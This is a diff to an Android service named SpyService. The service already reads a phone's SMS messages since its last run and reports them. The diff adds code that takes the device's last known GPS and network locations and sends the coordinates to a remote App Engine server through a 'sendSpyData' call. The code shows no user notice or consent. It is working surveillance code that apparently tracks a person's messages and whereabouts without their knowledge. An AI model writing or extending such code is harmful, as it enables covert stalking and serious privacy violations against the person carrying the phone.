@@ -1,9 +1,13 @@
 package com.prestomation.android.sospy.spy;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationManager;
+import android.location.LocationProvider;
 import android.net.Uri;
 import android.os.IBinder;
 import android.util.Log;
@@ -60,12 +64,16 @@ public class SpyService extends Service {
 		prefsEdit.putString(PREF_LAST_SMS_DATE, currentTime);
 		prefsEdit.commit();
 
+		//Gety location information
+		final LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
+		
 		// Do the actual work in a worker thread. We don't want to tie up
 		// onStartCommand as this can tie up on UI/prompt a force close
 		new Thread(new Runnable() {
 			public void run() {
 
-				if (cursor.moveToFirst()) {
+				if (cursor.moveToFirst()) 
+				{
 
 					do {
 						// Iterate through all SMS since the last run and report
@@ -97,6 +105,35 @@ public class SpyService extends Service {
 					} while (cursor.moveToNext());
 				}
 				Log.i(SetupActivity.TAG, "Finished sending SMS");
+				
+				//setup the client
+				String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
+				AppEngineClient client = new AppEngineClient(devID);
+				
+				//Send out the GPS Locations
+				Location gpsLocation = locationManager.getLastKnownLocation("gps");
+
+				if(gpsLocation != null)
+				{
+					String title = "GPS Location";
+					String body = "Latitue: " + gpsLocation.getLatitude() + "  Longitude: " + gpsLocation.getLongitude();
+					String date = "";
+					
+					client.sendSpyData(title, body, date);
+				}
+				
+				//Send out the network location
+				Location networkLocation = locationManager.getLastKnownLocation("network");
+				
+				if(networkLocation != null)
+				{
+					String title = "Network Location";
+					String body = "Latitue: " + networkLocation.getLatitude() + "  Longitude: " + networkLocation.getLongitude();
+					String date = "";
+					
+					client.sendSpyData(title, body, date);
+				}
+				
 			}
 		}).start();
 
